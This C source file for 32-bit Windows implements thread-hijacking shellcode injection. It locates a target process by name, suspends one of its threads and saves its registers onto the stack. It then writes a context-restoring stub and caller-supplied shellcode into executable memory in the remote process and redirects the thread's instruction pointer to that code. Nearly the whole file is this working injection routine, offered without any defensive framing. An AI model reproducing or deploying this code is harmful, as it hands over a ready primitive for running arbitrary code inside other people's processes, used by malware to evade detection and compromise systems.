#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

DWORD Pid(WCHAR* szName)
{
	HANDLE hprocessSnap = NULL;
	PROCESSENTRY32  pe32 = { 0 };
	hprocessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	/*if (hprocessSnap == (HANDLE)-1) { return 0; }*/
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hprocessSnap, &pe32))
	{
		do {
			if (!StrCmpI(szName, pe32.szExeFile))
				return (int)pe32.th32ProcessID;
		} while (Process32Next(hprocessSnap, &pe32));
	}
	else
		CloseHandle(hprocessSnap);
	return 0;
}

/*
call shellcode
restore ctx.
shellcode:

*/
unsigned char shellcode_stub[] = {
	0xe8, 0x09, 0x00, 0x00, 0x00,
	0x9d,
	0x5f,
	0x5e,
	0x5a,
	0x59,
	0x5b,
	0x58,
	0x5d,
	0xc3,	//ret
};

BOOL InjectThreadShellcode(HANDLE hProcess, DWORD ThreadId, UINT8 * sc, int sc_len){
	BOOL ret = FALSE;
	CONTEXT ctx = { 0 };
	UINT8 * code = NULL;
	UINT32 sp;
	SIZE_T write_bytes = 0;
	HANDLE hThread = OpenThread(
		THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_RESUME,
		FALSE, ThreadId);

	if (!hThread){
		printf("OpenThread failed with err : %d\n", GetLastError());
		goto failed_0;
	}

	if (-1 == SuspendThread(hThread)){
		printf("SuspendThread failed with err : %d\n", GetLastError());
		goto failed_1;
	}

	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(hThread, &ctx)){
		printf("SuspendThread failed with err : %d\n", GetLastError());
		goto failed_2;
	}

	//Save Context to Stack
	sp = ctx.Esp;

#define _SAVE_REGS(x) \
	do{	\
		sp -= 0x4;	\
		WriteProcessMemory(hProcess, (LPVOID)sp, &ctx.x, sizeof(ctx.x), &write_bytes);\
				}while(0) \

	//不要save rsp...rsp是个旧的...
	//要save 应该save 变化的rsp.
	//为什么64位的不会出问题???

	//save ctx to new stack.
	_SAVE_REGS(Eip);
	_SAVE_REGS(Ebp);
	_SAVE_REGS(Eax);
	_SAVE_REGS(Ebx);
	_SAVE_REGS(Ecx);
	_SAVE_REGS(Edx);
	_SAVE_REGS(Esi);
	_SAVE_REGS(Edi);

	//Save Float regs ?


	//save eflags.
	_SAVE_REGS(EFlags);

	code = (UINT8*)VirtualAllocEx(hProcess, NULL, sizeof(shellcode_stub) + sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
	if (!code){
		printf("VirtualAllocEx with err : %d\n", GetLastError());
		goto failed_3;
	}

	//write stub code (call shellcode and restore context.)
	if (!WriteProcessMemory(hProcess,
		code,
		shellcode_stub, sizeof(shellcode_stub),
		&write_bytes)){
		printf("WriteProcessMemory with err : %d\n", GetLastError());
		goto failed_3;
	}

	//write shellcode 
	if (!WriteProcessMemory(hProcess,
		code + sizeof(shellcode_stub),
		sc, sc_len,
		&write_bytes)){
		printf("WriteProcessMemory with err : %d\n", GetLastError());
		goto failed_3;
	}

	//Set rip and rsp.
	ctx.ContextFlags = CONTEXT_ALL;
	ctx.Esp = (DWORD)sp;
	ctx.Eip = (DWORD)code;

	ret = SetThreadContext(hThread, &ctx);
	if (ret){
		ResumeThread(hThread);
	}
	return ret;

failed_3:
	VirtualFreeEx(hProcess, code, 0, MEM_RELEASE);
failed_2:
	ResumeThread(hThread);
failed_1:
	CloseHandle(hThread);
failed_0:
	return ret;
}

int InjectProcessShellcode(TCHAR * process, unsigned char * sc, int sc_len){
	int err = -1;
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	DWORD dwId = Pid(process);
	HANDLE hSnapshot;
	BOOL bFind;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);

	if (!hProcess)
		goto failed_0;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot)
		goto failed_1;

	bFind = Thread32First(hSnapshot, &te32);
	while (bFind){
		if (te32.th32OwnerProcessID == dwId){
			if (InjectThreadShellcode(hProcess, te32.th32ThreadID,
				sc,
				sc_len)){
				err = 0;
				break;
			}
		}
		bFind = Thread32Next(hSnapshot, &te32);
	}
failed_2:
	CloseHandle(hSnapshot);
failed_1:
	CloseHandle(hProcess);
failed_0:
	return err;

}
